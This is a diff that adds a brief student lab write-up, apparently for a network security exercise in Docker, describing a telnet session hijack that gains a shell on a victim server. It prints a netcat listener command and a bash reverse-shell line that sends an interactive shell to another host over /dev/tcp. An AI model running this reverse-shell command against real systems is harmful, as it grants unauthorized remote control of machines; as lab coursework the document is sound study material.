@@ -1,0 +1,6 @@
+This is same as Q3's actions.
+First of all i ran docker-compose up,
+   i run command "telnet 10.9.0.7" and checked it with wireshark.
+as shown above screenshots. I changed python code with server ip(10.9.0.5) and ran it.
+and then I executed command "nc -lnv 9090 , /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1" on victim server "10.9.0.5"
+so i could result as shown above screenshots and created shell on server.
